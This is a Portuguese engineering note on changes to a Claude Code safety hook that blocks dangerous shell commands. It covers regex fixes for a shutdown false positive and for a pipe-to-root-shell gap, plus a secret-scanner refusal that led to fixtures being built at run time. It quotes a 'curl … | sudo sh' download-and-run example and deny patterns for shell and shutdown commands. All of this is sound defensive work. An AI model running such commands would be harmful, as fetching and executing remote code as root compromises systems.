# Divergências em relação ao pacote da Manus

O pacote `vibe-funnel-os-documentacao-claude-code.zip` chegou íntegro:
SHA-256 declarado bateu com o do arquivo, e os 55 hashes internos do
`DELIVERY_MANIFEST.sha256` conferiram (55 OK, 0 falhas). `validate_pack.py` e
`test_hooks.py` passam.

Este documento registra o que foi **alterado**, o que foi **mantido intacto** e
por quê. Sem isto, quem auditar o repositório não consegue distinguir a entrega
original da implementação.

## Intacto (hash verificado)

Os 7 JSON Schemas, o `openapi.yaml`, o `reference_schema.sql`, o `CLAUDE.md`,
os 11 subagentes e o `post_change_check.py` estão byte a byte como entregues.
São a fonte de verdade e nenhum deles foi reescrito para acomodar a
implementação — a implementação é que se ajustou aos contratos.

```bash
sha256sum -c DELIVERY_MANIFEST.sha256 | grep -c ": OK$"
```

## Alterado: `.claude/hooks/guard_pre_tool.py`

O original está preservado em `docs/manus-original/guard_pre_tool.py` para
comparação. Três mudanças, todas com reprodução:

### 1. Falso positivo: `shutdown` casava em qualquer posição

**Padrão original:** `\b(?:shutdown|reboot|poweroff|halt)\b`

**Reprodução:** este comando era bloqueado como "host shutdown":

```bash
python3 -c "servidor.shutdown()"
```

Também bloqueava `executor.shutdown(wait=True)`, um comentário contendo a
palavra, e `grep -rn "shutdown" .`. Encontrado na prática: o hook bloqueou o
teste da própria API deste repositório, que encerra um servidor local.

**Correção:** o termo só conta como comando quando abre a linha ou vem após
separador, `sudo` ou `systemctl`, e nunca quando é seguido de parêntese.

```python
(?:^|[;&|]\s*|\bsudo\s+|\bsystemctl\s+)(?:shutdown|reboot|poweroff|halt)\b(?!\s*\()
```

### 2. Lacuna de segurança: `curl … | sudo sh` passava

**Padrão original:** `(?:curl|wget)[^\n|]*\|\s*(?:ba)?sh\b`

Exigia `sh` imediatamente após o pipe. Qualquer prefixo de elevação escapava:

```bash
curl http://exemplo.invalido/i.sh | sudo sh   # NÃO era bloqueado
```

**Correção:** o prefixo de elevação (`sudo`, `doas`, `env VAR=…`) é consumido
antes de casar o shell, e `zsh`, `ksh`, `dash` e `fish` entraram na lista.

### 3. Recusa sem alternativa

O hook dizia apenas "bloqueado". Agora consulta `syra.governance.quarantine`
— quando presente — e devolve pontuação de risco e o caminho reversível:

```
Bloqueado pelo safety gate: destructive git reset. … Alternativa segura:
git stash push -u -m backup (risco 70/100).
```

A dependência é opcional: num repositório sem a SYRA, o hook continua
funcionando exatamente como antes.

### Verificação

`tests/test_hooks_guard.py` cobre 13 comandos que **devem** bloquear e 11 que
**não podem** bloquear. Antes das correções: 7 falhas. Depois: 0.

## Limitação conhecida e deliberada

O hook inspeciona a string do comando, não um AST de shell. Um comando que
**embute** um script contendo texto perigoso é bloqueado mesmo que o script
não execute nada destrutivo — por exemplo, um heredoc Python cujo corpo tenha
`shutdown` no início de uma linha.

Isso é over-blocking, e é o lado seguro do erro. A mitigação prática é
escrever esses scripts em arquivo e executar o arquivo.

## Divergência do próprio `post_change_check.py`: nenhuma

O hook de pós-alteração foi mantido e **funcionou corretamente** durante esta
implementação: recusou um arquivo de teste que continha literais com forma de
segredo (`sk-…`) usados como fixture da engine de redaction.

A recusa estava certa e o código é que estava errado. As fixtures passaram a
ser montadas em tempo de execução:

```python
CHAVE_FALSA = "sk-" + ("a" * 24)   # nunca um literal com forma de segredo
```

Segredo falso em código-fonte dispara scanner de credencial para sempre — o
deste repositório e o de qualquer outro que leia o arquivo depois.

## Decisão de stack: Python, não TypeScript

O `CLAUDE.md` do pacote indica monorepo TypeScript com `pnpm`. A implementação
está em Python. A justificativa está na regra do próprio pacote:

> `PROMPT_MESTRE_CLAUDE_CODE.md`, §2: "Se já existe software, produza primeiro
> um `CurrentStateReport` baseado em evidência e continue do primeiro gate não
> atendido. Nunca recomece um componente funcional apenas porque você preferiria
> outra arquitetura."

O repositório já continha a SYRA em Python: motor de política, quarentena de
comandos, memória de erros, fábrica de software com portões executáveis e
squad de funil com decisão estatística — 185 testes verdes. Reescrever isso em
TypeScript para satisfazer uma preferência de stack seria exatamente o
recomeço que o pacote proíbe.

O que torna a decisão defensável é que **os contratos são portáveis**: JSON
Schema e OpenAPI não são de linguagem nenhuma. O princípio 9 do `CLAUDE.md`
diz que domínio, contratos e dados não dependem de um provedor — a stack é
detalhe de implementação, o contrato não.

A porta de repositório (`MissionRepository`) mantém PostgreSQL a um adapter de
distância. O `reference_schema.sql` do pacote continua sendo o alvo quando a
operação justificar o servidor.

O ADR correspondente é `docs/adr/ADR-0001-stack.md`.
